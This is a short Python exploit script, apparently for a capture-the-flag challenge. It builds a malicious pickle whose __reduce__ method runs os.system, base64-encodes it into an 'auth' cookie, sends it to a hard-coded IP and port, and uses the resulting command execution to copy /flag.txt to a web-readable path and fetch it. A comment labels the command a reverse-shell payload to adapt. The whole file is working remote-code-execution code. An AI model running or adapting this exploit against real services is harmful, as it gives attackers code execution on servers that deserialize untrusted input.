#!/usr/bin/python
#
# Pickle deserialization RCE exploit
# calfcrusher@inventati.org
#
# Usage: ./Pickle-PoC.py [URL]

import pickle
import base64
import requests
import sys

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

default_url = 'http://83.136.253.59:53447/home'
url = sys.argv[1] if len(sys.argv) > 1 else default_url
command = 'cat /flag.txt >/app/application/static/js/flag2.txt'  # Reverse Shell Payload Change IP/PORT

pickled = 'auth'  # This is the POST parameter of our vulnerable Flask app
payload = base64.urlsafe_b64encode(pickle.dumps(PickleRCE())).decode('utf-8')  # Crafting Payload
print(payload)
 # Sending POST request
print(requests.get(url, cookies={pickled: payload}) )
flag = requests.get(f'http://83.136.253.59:53447/static/js/flag2.txt')
print('[*] %s' % flag.content.decode('utf-8'))


